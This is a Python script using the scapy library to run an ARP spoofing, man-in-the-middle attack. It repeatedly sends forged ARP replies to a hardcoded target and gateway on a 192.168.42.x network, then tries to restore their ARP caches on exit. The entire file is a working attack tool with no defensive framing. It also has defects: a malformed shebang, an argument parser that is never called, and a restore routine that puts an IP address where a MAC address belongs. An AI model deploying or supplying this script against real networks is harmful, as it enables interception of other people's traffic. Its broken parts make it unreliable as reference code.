#!usr/bin/env python3
import logging
import optparse
import scapy.all as scapy
import time

logging.getLogger("scapy.runtime").setLevel(40)

def getArgs():
    parser = optparse.OptionParser()

    parser.add_option("-t", "--target", dest="target", help="Target IP")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP")
    
    options, arguments = parser.parse_args()
    
    if not options.target:
        parser.error("[-] Please specify a target IP, use --help for more info.")
    if not options.gateway:
        parser.error("[-] Please specify a gateway IP, use --help for more info.")

    return options

def getMac(ip):
    try:
        arpRequest = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arpRequestBroadcast = broadcast/arpRequest
        
        answered = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
        
        return answered[0][1].hwsrc
    except:
        exit(f"\n[-] Couldn't get MAC Address for {ip}.")

def spoof(targetIP, spoofIP):
    targetMac = getMac(targetIP)
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=spoofIP)
    scapy.send(packet, verbose=False)
    
def restore(destIP, sourceIP):
    destMac = getMac(destIP)
    sourceMac = getMac(sourceIP)
    packet = scapy.ARP(op=2, pdst=destIP, hwdst=destMac, psrc=sourceIP, hwsrc=sourceIP)
    scapy.send(packet, count=4, verbose=False)
    
targetIP = "192.168.42.2"
gatewayIP = "192.168.42.1"

try:
    packetsCount = 0    
    while True:
        spoof(targetIP, gatewayIP)
        spoof(gatewayIP, targetIP)
        
        packetsCount += 2
        print(f"\r[+] Packets sent: {packetsCount}", end="")
        
        time.sleep(1)
except KeyboardInterrupt:
    restore(targetIP, gatewayIP)
    restore(gatewayIP, targetIP)
    print("\n[+] Quitting.")